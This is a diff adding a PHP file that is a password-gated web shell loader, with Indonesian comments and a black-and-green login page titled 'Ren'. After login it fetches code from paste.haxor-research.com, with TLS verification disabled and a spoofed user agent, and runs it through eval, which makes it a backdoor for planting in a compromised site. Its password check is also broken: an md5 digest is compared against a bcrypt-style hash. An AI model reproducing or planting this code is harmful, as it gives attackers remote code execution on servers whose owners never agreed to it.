@@ -1,0 +1,62 @@
+??<?php
+session_start();
+
+// Fungsi cek login
+function isLoggedIn() {
+    return isset($_SESSION['auth']) && $_SESSION['auth'] === true;
+}
+
+// Fungsi ambil konten dari remote
+function fetchPayload($url) {
+    if (function_exists('curl_exec')) {
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_USERAGENT => 'Mozilla/5.0'
+        ]);
+        $output = curl_exec($ch);
+        curl_close($ch);
+        return $output;
+    } elseif (function_exists('file_get_contents')) {
+        return file_get_contents($url);
+    }
+    return false;
+}
+
+// Cek password
+if (isset($_POST['access'])) {
+    $input = $_POST['access'];
+    $valid = '$2y$10$n8sulyHeIm1bBADIo4ra5OahsmeXIrGpYh5lRdjWPm5llMTp41QMG'; // md5(aptools)
+    if (md5($input) === $valid) {
+        $_SESSION['auth'] = true;
+    }
+}
+
+// Jika login berhasil, ambil kode dari luar
+if (isLoggedIn()) {
+    $remote = fetchPayload('https://paste.haxor-research.com/raw/75f991d9');
+    if ($remote) {
+        eval("?>$remote");
+    } else {
+        echo "Failed to load remote content.";
+    }
+} else {
+    // Form login
+    ?>
+    <html><head><title>Ren</title>
+    <style>
+        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; }
+        form { color:#fff; font-family:monospace; }
+        input { background:#111; border:none; color:#0f0; padding:8px; }
+    </style></head><body>
+    <form method="post">
+        <label>Password:</label>
+        <input type="password" name="access" autocomplete="off" autofocus>
+    </form>
+    </body></html>
+    <?php
+}
+?>
